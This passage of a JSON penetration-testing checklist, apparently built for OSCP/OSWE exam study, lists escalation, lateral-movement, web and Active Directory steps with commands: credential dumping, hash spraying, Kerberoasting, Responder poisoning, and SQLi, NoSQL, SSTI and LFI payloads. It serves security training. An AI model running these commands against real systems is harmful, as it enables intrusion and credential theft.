     "why": "pspy shows root jobs, their full command lines and their relative-path script calls that `crontab -l` as a low-priv user cannot show you at all.",
     "cmd": "./pspy64"
    },
    {
     "text": "Which of your groups is not standard — docker, lxd, disk, adm, shadow, video, sudo, or a custom one?",
     "why": "Group membership is frequently a one-liner to root; tools colour it and never explain that it is game over.",
     "cmd": "id; getent group | grep $(whoami)"
    },
    {
     "text": "Among the SUID binaries, is there one that is CUSTOM — a name you do not recognise from a distro?",
     "why": "On hard boxes the intended path is a bespoke SUID binary calling system() on a relative path, and it is invisible in a list of known-good SUIDs.",
     "cmd": "find / -perm -4000 -type f 2>/dev/null"
    },
    {
     "text": "Have you checked capabilities? Not just SUID.",
     "why": "cap_setuid on python/perl is instant root, and almost nobody runs getcap.",
     "cmd": "getcap -r / 2>/dev/null"
    },
    {
     "text": "Is anything writable that matters — /etc/passwd, /etc/sudoers.d, a systemd unit, /etc/cron.d, a root-owned script?",
     "why": "Writable-and-executed-by-root is the whole game, and it is a different question from 'is there a known exploit'.",
     "cmd": "find / -writable -type f 2>/dev/null | grep -vE '^/(proc|sys|dev)'"
    },
    {
     "text": "Are you inside a container? Then root here may be worthless — look for the escape, the host mount, or the docker socket.",
     "why": "Half of 'privesc is impossible' is an unnoticed container where the real objective is breakout, not UID 0.",
     "cmd": "ls -la /.dockerenv 2>/dev/null; cat /proc/1/cgroup"
    },
    {
     "text": "What is on this box that the distro did not put there — /opt, /srv, /var/backups, /usr/local, /tmp, an odd directory at /?",
     "why": "The author had to physically place the vulnerable thing; anything non-standard is signal, and no automated tool knows what 'non-standard' means here.",
     "cmd": "ls -la /opt /srv /var/backups /usr/local/bin"
    },
    {
     "text": "Is your shell too degraded to see the truth — no TTY, no PATH, no environment? Fix the shell first.",
     "why": "su, ssh, sudo and interactive prompts all fail silently in a dumb shell and you conclude the credentials are wrong.",
     "cmd": "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'"
    },
    {
     "text": "Kernel exploits last, and only if the version genuinely matches exactly. Expect a crash.",
     "why": "Kernel exploitation is the biggest time sink and the least likely intended path on a modern lab or engagement.",
     "cmd": "uname -a; cat /etc/os-release"
    }
   ]
  },
  {
   "focus": "network",
   "phase": "privesc-windows",
   "items": [
    {
     "text": "whoami /priv — read every line including the disabled ones. SeImpersonate, SeAssignPrimaryToken, SeBackup, SeRestore, SeDebug, SeTakeOwnership?",
     "why": "Service accounts nearly always hold SeImpersonate, which is a one-step SYSTEM; 'Disabled' in that column is misread as 'unavailable' constantly.",
     "cmd": "whoami /priv"
    },
    {
     "text": "Are you already in the Administrators group and just need an elevated token rather than an exploit?",
     "why": "People spend hours escalating an account that is already admin sitting in a medium-integrity shell — the wall is UAC, not privilege.",
     "cmd": "whoami /groups | findstr /i S-1-5-32-544"
    },
    {
     "text": "Did winPEAS/Seatbelt actually run to completion, or did AV kill it and hand you a short clean output you read as 'nothing found'?",
     "why": "Silent truncation is the single biggest cause of missed Windows privesc; verify with a couple of native commands.",
     "cmd": "sc query type= service state= all | more"
    },
    {
     "text": "Have you read the PowerShell console history for every profile on disk?",
     "why": "ConsoleHost_history.txt contains plaintext passwords with remarkable regularity and almost nobody opens it.",
     "cmd": "type %APPDATA%\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt"
    },
    {
     "text": "Stored credentials everywhere else: cmdkey /list, Credential Manager, DPAPI blobs, unattend.xml, GPP cpassword, web.config, registry autologon, saved PuTTY/WinSCP/RDP sessions.",
     "why": "Windows hoards credentials in a dozen places and automated tools report them in a wall of text you scrolled past.",
     "cmd": "cmdkey /list; reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v DefaultPassword"
    },
    {
     "text": "Service misconfigurations — not just unquoted paths. Modifiable service permissions, writable service binary or its directory, writable service registry key.",
     "why": "Everyone checks unquoted paths; the one that actually wins is a service whose ACL lets you reconfigure its binPath.",
     "cmd": "accesschk.exe /accepteula -uwcqv \"Users\" *"
    },
    {
     "text": "What third-party software is installed in Program Files that Microsoft did not write?",
     "why": "On Windows targets the intended path is almost always a third-party product — a known local exploit, a writable install directory, or a service running as SYSTEM.",
     "cmd": "dir \"C:\\Program Files\" \"C:\\Program Files (x86)\""
    },
    {
     "text": "What is listening only on localhost?",
     "why": "An admin web interface or database bound to 127.0.0.1 is the reason you were given a shell rather than credentials.",
     "cmd": "netstat -ano | findstr LISTENING"
    },
    {
     "text": "Scheduled tasks running as another principal with a script or argument you can write to?",
     "why": "Task actions point at scripts in writable directories more often than services do, and task enumeration is usually skimmed.",
     "cmd": "schtasks /query /fo LIST /v"
    },
    {
     "text": "AlwaysInstallElevated — did you check BOTH HKLM and HKCU?",
     "why": "It only works when both are set, so people check one, see zero, and move on without checking the other.",
     "cmd": "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated & reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated"
    },
    {
     "text": "Have you looked at files rather than configuration — every Desktop, Documents, C:\\, inetpub, and any .bak/.old/.kdbx/.xml/.ps1 on all drives?",
     "why": "The password is in a file a human left behind, and no privesc tool scores 'notes.txt' as interesting.",
     "cmd": "findstr /si password *.xml *.ini *.txt *.config 2>nul"
    },
    {
     "text": "Is there another LOCAL user to become first, instead of going straight for SYSTEM?",
     "why": "The horizontal move is frequently the intended next step and people keep hunting for a vertical one that does not exist.",
     "cmd": "net user; dir C:\\Users"
    },
    {
     "text": "Did you re-run enumeration as the new identity after every single change of context?",
     "why": "Privilege, tokens, mapped drives and readable files are all per-user — the second pass finds what the first could not see.",
     "cmd": ""
    },
    {
     "text": "Is this host domain-joined? Then the answer may not be local at all.",
     "why": "On a domain member the escalation is often lateral — dump credentials and move rather than grinding for local SYSTEM.",
     "cmd": "systeminfo | findstr /i domain"
    }
   ]
  },
  {
   "focus": "network",
   "phase": "lateral",
   "items": [
    {
     "text": "Have you sprayed every credential, hash and key you now own against every host and every protocol?",
     "why": "Lateral movement IS credential reuse; people collect credentials and only ever try them where they found them.",
     "cmd": "netexec smb $SUBNET -u $USER -H $NTHASH --continue-on-success"
    },
    {
     "text": "Did you dump EVERYTHING dumpable from the host you already own — SAM, LSA secrets, cached domain credentials, DPAPI, browser stores, KeePass, SSH keys, .rdg files?",
     "why": "Everyone reaches for LSASS, AV eats it, and they never try LSA secrets — which holds service account passwords in cleartext.",
     "cmd": "impacket-secretsdump -sam sam.hive -system system.hive -security security.hive LOCAL"
    },
    {
     "text": "Re-run discovery FROM the compromised host: ARP cache, routes, hosts file, known_hosts, ssh config, internal DNS, listening ports.",
     "why": "The next hop is usually already sitting in the ARP table or known_hosts of the box you just took.",
     "cmd": "arp -a; cat ~/.ssh/known_hosts; ss -ntp"
    },
    {
     "text": "Is your tunnel actually working? Prove one TCP connection through it before blaming the target.",
     "why": "Half of 'the pivot host is dead' is a misconfigured proxychains/chisel/ligolo setup, and the symptoms are identical to a firewalled target.",
     "cmd": "proxychains -q nc -vz $NEXTHOP 445"
    },
    {
     "text": "Have you tried the boring transports — SSH with the key you found, WinRM, RDP, WMI, DCOM, service creation, scheduled task, MSSQL?",
     "why": "Access denied on one protocol is not access denied on the host; accounts routinely have exactly one usable path.",
     "cmd": ""
    },
    {
     "text": "If MSSQL is in play: linked servers and xp_cmdshell.",
     "why": "Trust links give you execution on a host you have no credentials for at all, and the link chain is invisible from the network.",
     "cmd": "SELECT * FROM master..sysservers"
    },
    {
     "text": "Are there credentials in the APPLICATION rather than the OS — connection strings, CI/CD config, backup jobs, monitoring agents, ansible/chef data?",
     "why": "Deployment and backup tooling stores the highest-privilege credentials in the environment, in plaintext, by design.",
     "cmd": ""
    },
    {
     "text": "Have you gone back to the host you wrote off early, now that you are inside and its internal-only ports are visible?",
     "why": "'Nothing on it' was an external judgement; the internal surface is a different machine.",
     "cmd": ""
    },
    {
     "text": "Is there an SSH agent socket or forwarded agent you can hijack on this host?",
     "why": "Agent hijacking gives you authentication to hosts whose keys you will never find on disk.",
     "cmd": "ls -la /tmp/ssh-*/*; env | grep SSH_AUTH_SOCK"
    },
    {
     "text": "Is the next hop even reachable directly, or do you need a second pivot? Draw the actual reachability matrix.",
     "why": "Assuming a flat network is the most common reason a working technique 'fails' against a host you cannot actually touch.",
     "cmd": ""
    },
    {
     "text": "On OSCP+, Metasploit cannot be used for pivoting at all — do you have chisel/ligolo/sshuttle ready before you need them?",
     "why": "Discovering the restriction mid-exam costs an hour you do not have. Verified: https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide",
     "cmd": ""
    },
    {
     "text": "Park this host, work a different target for thirty minutes, then re-read your notes.",
     "why": "At this stage the blocker is almost always a cell in your own matrix you cannot see any more; fresh eyes find it faster than more tooling.",
     "cmd": ""
    }
   ]
  },
  {
   "focus": "webapp",
   "phase": "recon",
   "items": [
    {
     "text": "Have you used the application as a USER first — registered, clicked every feature, completed every workflow — before firing a single scanner?",
     "why": "The bug is in the logic of a feature you never exercised; content discovery finds files, not features.",
     "cmd": ""
    },
    {
     "text": "Have you pulled apart the JavaScript — bundles, sourcemaps, API route tables, role names, feature flags, hardcoded keys?",
     "why": "A modern SPA ships its entire route and permission model to the client; the app tells you about endpoints no wordlist contains.",
     "cmd": "curl -s $URL/static/js/main.js | grep -oE '\"/api/[a-zA-Z0-9_/-]+\"' | sort -u"
    },
    {
     "text": "Are you fuzzing with an authenticated session, or unauthenticated against an app that requires login?",
     "why": "Unauthenticated dirbusting on a gated app returns nothing and feels like the app has no attack surface.",
     "cmd": "ffuf -u $URL/FUZZ -w list.txt -b \"session=$COOKIE\" -ac"
    },
    {
     "text": "Have you fuzzed the Host header for virtual hosts and subdomains, not just paths?",
     "why": "The IP serves a decoy while the real application only answers to a name, and no amount of path fuzzing finds it.",
     "cmd": "ffuf -u http://$IP -H 'Host: FUZZ.$DOMAIN' -w subs.txt -ac"
    },
    {
     "text": "Right wordlist, right extensions for this stack (.php/.aspx/.jsp/.do/.action/.cgi), recursion into what you found?",
     "why": "A generic list with no extensions against an ASP.NET app is a scan that was guaranteed to fail before it started.",
     "cmd": "feroxbuster -u $URL -x php,aspx,jsp,bak,old,zip"
    },
    {
     "text": "Checked the free wins: /.git, /.svn, .DS_Store, ~ and .bak siblings, /server-status, /actuator, /swagger, /api-docs, /.env, robots.txt?",
     "why": "An exposed .git is the whole source tree, which converts the entire engagement from blackbox to whitebox in one request.",
     "cmd": "curl -sI $URL/.git/HEAD"
    },
    {
     "text": "What product is this, exactly? Identify it, then go get the same version's source code and read it.",
     "why": "Whitebox beats blackbox every single time you can obtain the source, and most 'custom' apps are a known product with a theme on top.",
     "cmd": ""
    },
    {
     "text": "Have you forced error pages — bad types, huge values, arrays, null bytes, malformed JSON — and read the stack traces?",
     "why": "A forced traceback names the framework, version and absolute paths, which is half your exploitation research done.",
     "cmd": ""
    },
    {
     "text": "Read the response headers and cookie format: framework, server, session type (JWT? signed cookie? opaque? base64 blob?), CSP, CORS.",
     "why": "The session format decides which attack classes are even possible — you can stop testing three of them immediately.",
     "cmd": "curl -sI $URL"
    },
    {
     "text": "Have you tried non-GET/POST methods and a raw, non-browser request — OPTIONS, PUT, PROPFIND, HTTP/1.0 with no Host?",
     "why": "Method-based access control bugs and WebDAV endpoints are invisible to browser-driven and proxy-driven browsing.",
     "cmd": "curl -sX OPTIONS -i $URL"
    },
    {
     "text": "Is your proxy history full of endpoints you never actually looked at?",
     "why": "Passive collection outpaces your attention; the interesting route was recorded an hour ago and never opened.",
     "cmd": ""
    },
    {
     "text": "State in one sentence what this app is for. The intended attack usually abuses that purpose.",
     "why": "Uploaders, exporters, report generators, URL fetchers and importers each imply a specific vulnerability class by construction.",
     "cmd": ""
    }
   ]
  },
  {
   "focus": "webapp",
   "phase": "enumeration",
   "items": [
    {
     "text": "Have you tested EVERY parameter — hidden fields, cookies, headers (X-Forwarded-For, Referer, User-Agent), and JSON keys you can add yourself?",
     "why": "Injection lives in the parameter nobody types into; a User-Agent landing in a logging table is a decades-old classic that still works.",
     "cmd": ""
    },
    {
     "text": "Have you changed the TYPE of a parameter, not just its value — string to array, string to object, number to string, null?",
     "why": "NoSQL injection, type juggling and mass assignment only appear when you change shape; value fuzzing will never find them.",
     "cmd": "{\"user\":{\"$ne\":null},\"pass\":{\"$ne\":null}}"
    },
    {
     "text": "Did you actually take object IDs from account A and replay them as account B — on every endpoint, including PUT/DELETE and the export/print/PDF routes?",
     "why": "Authorization gets enforced on the read route and forgotten on the report route; that asymmetry is the bug.",
     "cmd": ""
    },
    {
     "text": "Have you fuzzed for parameter NAMES the app accepts but does not advertise?",
     "why": "Leftover debug/admin/test parameters are a standard intended path and no amount of path discovery reveals them.",
     "cmd": "ffuf -u '$URL/page?FUZZ=1' -w burp-parameter-names.txt -ac"
    },
    {
     "text": "Do you have two accounts with different roles, and have you diffed what each can reach?",
     "why": "Most authorization bugs are only visible as a difference; with one account you are guessing at the boundary.",
     "cmd": ""
    },
    {
     "text": "Are you testing first-order when the sink is second-order — stored input rendered later in an admin panel, an email, a log viewer, a PDF, a scheduled job?",
     "why": "The immediate response comes back clean and you mark the field safe, while the payload fires somewhere you never look.",
     "cmd": ""
    },
    {
     "text": "Is there any feature that fetches a URL, renders HTML/PDF, imports XML/CSV/ZIP, or processes an image?",
     "why": "Those four features are SSRF, XXE, zip-slip and image-library RCE by construction — they are not maybes.",
     "cmd": ""
    },
    {
     "text": "Have you probed for template injection in every reflected field, including name/profile fields that end up in emails?",
     "why": "SSTI hides in the templating layer rather than the response you are staring at, and one payload rules it in or out.",
     "cmd": "{{7*7}} ${7*7} <%=7*7%> #{7*7} ${{7*7}}"
    },
    {
     "text": "File upload: have you established WHERE the file lands and whether that path is served, before fighting the extension filter?",
     "why": "People spend an hour bypassing a filter to drop a webshell into a directory that is never executed.",
     "cmd": ""
    },
    {
     "text": "Have you looked at timing and error-message differences rather than response content?",
     "why": "Blind vulnerabilities look exactly like 'nothing happened', which is precisely why they survive testing.",
     "cmd": ""
    },
    {
     "text": "Have you attacked the account lifecycle — registration, password reset, email change — for token predictability, host-header poisoning, username collision/unicode, and races?",
     "why": "On OSWE-style targets the intended bug is in the auth flow, not in a CRUD endpoint.",
     "cmd": ""
    },
    {
     "text": "sqlmap is prohibited on OSCP+ and OSWE — have you tested injection by hand on every parameter, in every context?",
     "why": "People who lean on the tool never learn the manual probe and conclude 'no SQLi'. Verified: https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide and https://help.offsec.com/hc/en-us/articles/360046869951-WEB-300-Advanced-Web-Attacks-and-Exploitation-OSWE-Exam-Guide",
     "cmd": "' ORDER BY 1-- -"
    },
    {
     "text": "What did you flag as 'weird, come back to this' two hours ago? Go back to it now.",
     "why": "Your own instinct was right the first time; you deferred it because you were mid-scan.",
     "cmd": ""
    }
   ]
  },
  {
   "focus": "webapp",
   "phase": "foothold",
   "items": [
    {
     "text": "Whitebox: have you grepped for the routes that SKIP the auth middleware — every exclusion list, every filter bypass pattern, every unauthenticated decorator?",
     "why": "OSWE-style auth bypasses are almost always a route that was never meant to be reachable, not a clever crypto flaw.",
     "cmd": "grep -rniE 'excludePathPatterns|permitAll|AllowAnonymous|@csrf_exempt|auth: *false|skipAuth' ."
    },
    {
     "text": "Whitebox: have you diffed this version against the patched release and read the security commits?",
     "why": "The intended bug is exactly what the vendor fixed, and the diff hands it to you in minutes instead of days.",
     "cmd": "git log --oneline v$OLD..v$NEW | grep -iE 'fix|security|sanit|escape|auth'"
    },
    {
     "text": "Whitebox: are you reading top-down from index instead of starting at the SINK and working backwards?",
     "why": "Sink-first (exec, eval, deserialize, query concatenation, file write, redirect) finds the bug in an hour; reading the app in order takes days.",
     "cmd": "grep -rniE 'eval\\(|exec\\(|system\\(|unserialize|pickle.loads|ObjectInputStream|Runtime.getRuntime' ."
    },
    {
     "text": "Have you traced how the session token is GENERATED and whether you can forge one — predictable ID, weak secret, alg:none, unsigned cookie, user-controlled key ID?",
     "why": "Forging the token skips the entire authentication surface you have been grinding against.",
     "cmd": ""
    },
    {
     "text": "You have SQLi but no shell — have you tried file read, file write to webroot, the DB's own execution primitive, or simply dumping the admin hash and logging in like a person?",
     "why": "The escalation from SQLi stalls because people look for RCE when the intended step is 'read the credentials and log in'.",
     "cmd": "xp_cmdshell / SELECT ... INTO OUTFILE / COPY ... TO PROGRAM"
    },
    {
     "text": "You have LFI but no RCE — did you read the app's own config for database and SSH credentials BEFORE attempting log poisoning?",
     "why": "The config file is the answer far more often than any wrapper/session/proc chain, and it is one request.",
     "cmd": "php://filter/convert.base64-encode/resource=config.php"
    },
    {
     "text": "Upload filter blocking you — have you targeted what the SERVER executes rather than what the filter blocks (.phtml, .php5, .phar, .ashx, web.config, .htaccess), and confirmed the directory is executable?",
     "why": "Filters block a list; servers execute a different list, and the gap between them is the bug.",
     "cmd": ""
    },
    {
     "text": "Prove delivery with a benign marker — a unique string, a DNS callback — before concluding your payload is wrong.",
     "why": "Blind chains fail silently at the transport layer and everyone blames the payload instead of proving it arrived.",
     "cmd": ""
    },
    {
     "text": "Deserialization: have you identified the format (PHP O:, Java rO0/ACED, .NET, pickle, Node) and looked for gadgets in THIS app's actual dependency set?",
     "why": "Generic gadget chains fail; the chain that works is built from the libraries this app happens to ship.",
     "cmd": ""
    },
    {
     "text": "Is that 'low severity' XSS actually the path — is there an admin who views your input, and does the admin panel have a function you want?",
     "why": "Stored XSS to admin action to app-level RCE is the canonical OSWE chain, and people discard the XSS as not worth reporting.",
     "cmd": ""
    },
    {
     "text": "Does the app have a second interface — an API, a mobile endpoint, an internal port, an older version path — with weaker checks?",
     "why": "Auth is enforced properly in the web UI and reimplemented badly in the API, and only one of them gets tested.",
     "cmd": ""
    },
    {
     "text": "Egress blocked? Make the chain fully in-band — write output to a file the webroot serves, or return it in the response.",
     "why": "An out-of-band-only exploit fails on a target with no outbound access, which is most real ones.",
     "cmd": ""
    }
   ]
  },
  {
   "focus": "webapp",
   "phase": "privesc-linux",
   "items": [
    {
     "text": "Read every application config you can now reach — .env, settings.py, wp-config.php, config.php, appsettings.json, connection strings — and try each password as every local user.",
     "why": "The entire purpose of a www-data shell is to read the file that holds the real user's password.",
     "cmd": "grep -rniE 'password|passwd|secret|api[_-]?key' /var/www 2>/dev/null | head -50"
    },
    {
     "text": "Have you dumped the database locally — user table hashes, plaintext passwords, API tokens, reset tokens?",
     "why": "The application's own user table routinely contains a password that is also an OS account's password.",
     "cmd": "mysql -u root -p$PASS -e 'select * from users;' $DB"
    },
    {
     "text": "Is there a SECOND site or application on this server that you never saw from outside?",
     "why": "The vhost you cannot reach externally is where the escalation lives, and it is listed in the web server config you can now read.",
     "cmd": "ls -la /etc/apache2/sites-enabled /etc/nginx/sites-enabled /var/www"
    },
    {
     "text": "What is bound to 127.0.0.1 now that you are local — Redis, a second database, an admin panel, a queue?",
     "why": "Reaching localhost services is the reason the foothold has value; the external port was never the target.",
     "cmd": "ss -lntp"
    },
    {
     "text": "Have you read the RUNNING process's environment rather than the files on disk?",
     "why": "Secrets injected at deploy time (containers, systemd, CI) never touch the filesystem and are invisible to every file-based scan.",
     "cmd": "cat /proc/$(pgrep -n node || pgrep -n python3)/environ | tr '\\0' '\\n'"
    },
    {
     "text": "Is there a .git directory in or above the webroot? Read its history for deleted credentials.",
     "why": "Credentials get removed in a later commit and stay in the objects forever.",
     "cmd": "cd /var/www && git log -p 2>/dev/null | grep -iE 'pass|secret|key' | head"
    },
    {
     "text": "Who else lives on this box — /home/*, shells in /etc/passwd, mail spool, active sessions? Which one do you need to become?",
     "why": "The next step is usually horizontal to a named user, not vertical to root, and people only hunt for root.",
     "cmd": "ls -la /home; awk -F: '$3>=1000' /etc/passwd; w"
    },
    {
     "text": "Can www-data write anywhere that another user executes — deploy scripts, git hooks, cron, supervisor configs, backup jobs?",
     "why": "Web service accounts get write access to deployment paths by design, and those paths are run by someone else.",
     "cmd": ""
    },
    {
     "text": "Did you run sudo -l as www-data? Yes, really.",
     "why": "Application service accounts are given sudo entries for restart/deploy commands surprisingly often, and nobody thinks to check.",
     "cmd": "sudo -l"
    },
    {
     "text": "Are you in a container? Then stop hunting root and look for the mount, the socket, or the capability.",
     "why": "Root inside a container is not the objective and the time spent reaching it is wasted.",
     "cmd": "ls -la /.dockerenv /var/run/docker.sock 2>/dev/null; cat /proc/1/cgroup"
    },
    {
     "text": "Did you upgrade to a proper TTY before deciding commands 'do not work'?",
     "why": "su, ssh and sudo all need a terminal; without one they fail in a way that looks exactly like a wrong password.",
     "cmd": "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'; export TERM=xterm"
    },
    {
     "text": "Re-run the entire loop as the user you escalated to, not as www-data.",
     "why": "The surface is per-identity and the second pass is where the root path usually appears.",
     "cmd": ""
    }
   ]
  },
  {
   "focus": "webapp",
   "phase": "exploit-dev",
   "items": [
    {
     "text": "Does each stage work in isolation when you replay it by hand in the proxy? Bisect before you debug the whole chain.",
     "why": "Nine times in ten the chain is fine and one request's session/CSRF/nonce state changed underneath it.",
     "cmd": ""
    },
    {
     "text": "Is your script carrying state the way the browser did — cookies, CSRF token, anti-forgery field, Referer, redirect handling?",
     "why": "A bare requests call versus a session with automatic cookie handling is the single most common difference between 'works in Burp' and 'fails in Python'.",
     "cmd": "s = requests.Session()"
    },
    {
     "text": "Did you reproduce the request EXACTLY, including Content-Type and body encoding — JSON vs form vs multipart?",
     "why": "Frameworks parse each content type with a different binder; send the wrong one and your parameter silently goes nowhere while still returning 200.",
     "cmd": ""
    },
    {
     "text": "Is the target's state dirty from your previous runs — user already exists, row present, file already uploaded?",
     "why": "This is why an exploit 'works once and never again', and it is the failure mode that bites hardest on exam day. Make it idempotent or clean up.",
     "cmd": ""
    },
    {
     "text": "Are you inferring success from a 200 instead of asserting on a known marker?",
     "why": "A 200 with an error page in the body is the most common false success and it hides the real breakage three steps earlier.",
     "cmd": "assert 'Welcome, admin' in r.text, r.text[:500]"
    },
    {
     "text": "Is there an async or timing dependency — token TTL, background job, email delivery, cache warm-up — that works when you do it slowly by hand?",
     "why": "Add polling with a timeout, not a retry loop; retries on a one-shot token make it worse.",
     "cmd": ""
    },
    {
     "text": "Have you made it log every step and every status, so a failure tells you WHERE?",
     "why": "A silent exploit that fails at an unknown point costs more time to debug than it took to write.",
     "cmd": ""
    },
    {
     "text": "Does your payload need to survive an encoding, a length cap, a character allow-list, or a newline ban at this injection point?",
     "why": "Stage it — a tiny stager that writes the real payload — rather than fighting the constraint with the full payload.",
     "cmd": ""
    },
    {
     "text": "Are you developing against your own instance while the target runs a different version or configuration?",
     "why": "Version-specific parameter names and route prefixes turn a working exploit into an unexplained 404.",
     "cmd": ""
    },
    {
     "text": "Does the chain need an outbound callback the target cannot make? Convert it to fully in-band.",
     "why": "Out-of-band-only exploits are useless against egress-filtered targets, which is most of them.",
     "cmd": ""
    },
    {
     "text": "Has it run end to end, unattended, from a clean target snapshot, with one command and no manual fixes?",
     "why": "That is the only thing that is actually graded, and a chain you have to nurse by hand will fail when someone else runs it.",
     "cmd": "python3 exploit.py $TARGET $LHOST $LPORT"
    },
    {
     "text": "Save a known-working copy before you 'improve' it.",
     "why": "The most expensive fifteen minutes of any exam is re-deriving an exploit you had working an hour ago.",
     "cmd": ""
    }
   ]
  },
  {
   "focus": "ad",
   "phase": "recon",
   "items": [
    {
     "text": "Do you actually know the domain name, the DC, and the FQDN — from LDAP, SMB or DNS rather than assumption?",
     "why": "Every AD tool needs the correct domain and FQDN, and half of 'nothing works' is a wrong or short name.",
     "cmd": "netexec smb $IP; ldapsearch -x -H ldap://$IP -s base namingcontexts"
    },
    {
     "text": "Have you built a user list yet? RID cycling, LDAP anon, Kerberos enumeration, SMTP, names in shares, names on the website.",
     "why": "Every AD path starts with a valid username; without a list you are not stuck, you simply have not started.",
     "cmd": "kerbrute userenum -d $DOMAIN --dc $DC users.txt"
    },
    {
     "text": "Did you check for accounts with Kerberos pre-auth disabled? It needs no credentials at all.",
     "why": "One command, a crackable hash, and everyone skips straight past it to password spraying.",
     "cmd": "impacket-GetNPUsers $DOMAIN/ -usersfile users.txt -dc-ip $DC -no-pass"
    },
    {
     "text": "Did you pull the password policy BEFORE spraying anything?",
     "why": "A blind spray locks out accounts and can end an engagement or an exam; the lockout threshold is readable with a null or guest session.",
     "cmd": "netexec smb $DC -u guest -p '' --pass-pol"
    },
    {
     "text": "Null AND guest sessions against SMB and LDAP on every host, not just the DC?",
     "why": "One misconfigured member server with guest enabled exposes shares, users and often credentials for the whole domain.",
     "cmd": "netexec smb $SUBNET -u guest -p '' --shares"
    },
    {
     "text": "Have you read the LDAP description/info fields, not just the object names?",
     "why": "Passwords in the description attribute are alive and well, and no graph tool puts them in front of you.",
     "cmd": "ldapsearch -x -H ldap://$DC -b \"$BASEDN\" \"(objectClass=user)\" description info"
    },
    {
     "text": "Have you looked at the NON-DC hosts at all?",
     "why": "The way into a domain is almost always a member server — a print server, a Jenkins box, a file share, a web app — not the domain controller.",
     "cmd": ""
    },
    {
     "text": "Is your clock synced to the DC and are you using hostnames rather than IPs?",
     "why": "Kerberos fails on skew and on IP-based SPNs with errors that read exactly like wrong credentials.",
     "cmd": "sudo ntpdate -u $DC; cat /etc/hosts"
    },
    {
     "text": "Is ADCS present? Find the CA now, before you have credentials.",
     "why": "Certificate misconfigurations are frequently the shortest path from one low-priv account to domain admin, and they are invisible to a shares-and-groups review.",
     "cmd": "certipy find -u $USER@$DOMAIN -p $PASS -dc-ip $DC -stdout"
    },
    {
     "text": "Are you permitted to poison? If the rules allow it, Responder/mitm6 collects hashes while you work on something else.",
     "why": "LLMNR/NBT-NS/IPv6-DNS is the most reliable no-credential foothold in real environments — but check the engagement or exam rules first.",
     "cmd": "sudo responder -I eth0"
    },
    {
     "text": "Is there a web application on one of these hosts?",
     "why": "The AD foothold is very often a boring web vulnerability on a member server, and AD-focused tooling will never find it.",
     "cmd": ""
    },
    {
     "text": "Anonymous SMB shares — did you read SYSVOL/NETLOGON logon scripts?",
     "why": "Logon scripts and leftover GPP files contain credentials and map the environment for you, and they are readable more often than people expect.",
     "cmd": "smbclient -N //$DC/NETLOGON -c 'recurse ON; ls'"
    }
   ]
  },
  {
   "focus": "ad",
   "phase": "enumeration",
   "items": [
    {
     "text": "Did you mark every principal you own as Owned in BloodHound and then run 'shortest path from owned'?",
     "why": "The paths only materialise once ownership is marked — people collect the data, look at the default view, and see nothing.",
     "cmd": "bloodhound-python -u $USER -p $PASS -d $DOMAIN -dc $DC -c All"
    },
    {
     "text": "Have you Kerberoasted and cracked with rules, not a bare wordlist — and tried the service name itself as the password?",
     "why": "Service account passwords are old, human-chosen and almost always crackable with one mutation rule.",
     "cmd": "impacket-GetUserSPNs $DOMAIN/$USER:$PASS -dc-ip $DC -request"
    },
    {
     "text": "Where are you a local admin? That single question turns credentials into a shell.",
     "why": "People enumerate the directory for hours without ever asking the network which hosts accept these credentials as admin.",
     "cmd": "netexec smb $SUBNET -u $USER -p $PASS"
    },
    {
     "text": "Have you read the raw LDAP yourself instead of only BloodHound's graph — descriptions, info, userAccountControl flags, custom OUs, managed-by, service principal names?",
     "why": "BloodHound shows edges between objects; it does not show you a password someone typed into a description field.",
     "cmd": ""
    },
    {
     "text": "Have you spidered every share you can now reach as this user, recursively, for configs, scripts, spreadsheets and .kdbx files?",
     "why": "New credentials unlock new shares, and the share you could not read yesterday is the one with the password file.",
     "cmd": "netexec smb $SUBNET -u $USER -p $PASS -M spider_plus"
    },
    {
     "text": "Run the ADCS enumeration with THESE credentials — enrolment rights are per-principal.",
     "why": "An ESC path invisible to your first account can be wide open to your second, and nobody re-runs certipy after collecting new creds.",
     "cmd": "certipy find -u $USER@$DOMAIN -p $PASS -dc-ip $DC -vulnerable -stdout"
    },
    {
     "text": "What does this user's group membership grant TRANSITIVELY — GenericAll, WriteDACL, AddMember, ForceChangePassword on which objects?",
     "why": "Nested group plus an object ACL is the intended path on most modern AD labs, and `net user` cannot show you either half of it.",
     "cmd": ""
    },
    {
     "text": "Delegation: unconstrained, constrained, RBCD — and do you control anything with an SPN, or is MachineAccountQuota still the default 10?",
     "why": "MachineAccountQuota lets any domain user create a computer object, which is the missing ingredient for most RBCD attacks.",
     "cmd": "netexec ldap $DC -u $USER -p $PASS -M maq"
    },
    {
     "text": "Can you read LAPS or gMSA passwords with the rights you already have?",
     "why": "It is a single flag on a tool you are already running, and it hands you local admin on every managed host at once.",
     "cmd": "netexec ldap $DC -u $USER -p $PASS --laps; netexec ldap $DC -u $USER -p $PASS --gmsa"
    },
    {
     "text": "SYSVOL and GPO contents — GPP cpassword, scheduled task XML, logon scripts with embedded credentials?",
     "why": "GPP cpassword is ancient, publicly decryptable and still present in real domains and in labs built to teach exactly this.",
     "cmd": "netexec smb $DC -u $USER -p $PASS -M gpp_password"
    },
    {
     "text": "Is there a trust to another domain or forest? Enumerate it with the same credentials.",
     "why": "The objective often lives across a trust, and people treat the current domain as the whole world.",
     "cmd": "netexec ldap $DC -u $USER -p $PASS -M enum_trusts"
    },
    {
     "text": "Is there a credential you already collected — from a share, a config, a note — that you have never actually used?",
     "why": "Unused credentials in your notes are the most common source of a breakthrough at this stage.",
     "cmd": ""
    }
   ]
  },
  {
   "focus": "ad",
   "phase": "foothold",
   "items": [
    {
     "text": "Have you checked every host for a Pwn3d! rather than only the ones that look interesting?",
     "why": "Your shell is wherever this account is local admin, and that is rarely the host you were focused on.",
     "cmd": "netexec smb targets.txt -u $USER -p $PASS"
    },
    {
     "text": "WinRM refused? Try SMB exec, WMI, DCOM, scheduled tasks, RDP and MSSQL before concluding the account is useless.",
